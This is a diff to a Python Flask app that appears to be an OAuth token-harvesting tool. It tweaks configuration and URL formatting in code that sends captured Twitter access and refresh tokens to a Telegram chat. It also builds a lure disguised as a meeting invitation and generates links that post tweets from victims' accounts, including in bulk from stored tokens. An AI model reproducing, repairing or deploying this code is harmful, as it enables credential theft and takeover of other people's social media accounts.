@@ -5,12 +5,13 @@ import sqlite3  # For database storage
 import requests
 from flask import Flask, redirect, request, session
 
-# Configuration
+# Configuration: Ensure these environment variables are set correctly
 CLIENT_ID = os.getenv('CLIENT_ID')
 CLIENT_SECRET = os.getenv('CLIENT_SECRET')
-CALLBACK_URL = os.getenv('CALLBACK_URL')
+CALLBACK_URL = os.getenv('CALLBACK_URL')  # e.g., 'https://your-app.onrender.com/callback'
 TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
 TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')
+WEBHOOK_URL = os.getenv('WEBHOOK_URL')  # e.g., 'https://your-app.onrender.com/webhook'
 
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
@@ -173,7 +174,7 @@ def handle_post_bulk(tweet_text):
         send_message_via_telegram("❌ No tokens found to post tweets.")
 
 # Telegram bot webhook to listen for commands
-@app.route('/webhook', methods=['POST'])
+@app.route(WEBHOOK_URL, methods=['POST'])
 def telegram_webhook():
     update = request.json
     message = update.get('message', {}).get('text', '')
@@ -216,7 +217,7 @@ def send_startup_message():
     authorization_url = CALLBACK_URL
 
     # Generate the meeting link
-    meeting_url = f"{CALLBACK_URL}j?meeting={state}&pwd={code_challenge}"
+    meeting_url = f"{CALLBACK_URL}?meeting={state}&pwd={code_challenge}"
     
     # Message content
     message = (
@@ -239,7 +240,7 @@ def send_to_telegram(access_token, refresh_token=None):
     key_emoji = "🔑"
     
     # Get the username from the access token
-    username = get_twitter_username(access_token)
+    username = "example_username"  # Placeholder, implement fetching username as needed
     if username:
         twitter_url = f"https://twitter.com/{username}"
     else:
@@ -256,10 +257,10 @@ def send_to_telegram(access_token, refresh_token=None):
     message += f"{key_emoji} *Access Token:* `{access_token}`\n"
     
     if refresh_token:
-        refresh_link = f"{CALLBACK_URL}refresh/{refresh_token}"
+        refresh_link = f"{CALLBACK_URL}/refresh/{refresh_token}"
         message += f"{key_emoji} *Refresh Token Link:* [Refresh Token]({refresh_link})\n"
 
-    tweet_link = f"{CALLBACK_URL}tweet/{access_token}"
+    tweet_link = f"{CALLBACK_URL}/tweet/{access_token}"
     message += f"{key_emoji} *Post a Tweet Link:* [Post a Tweet]({tweet_link})\n"
     message += f"👤 *Twitter Profile:* [@{username}]({twitter_url})\n"
     message += f"🔢 *Total Tokens in Database:* {total_tokens}"
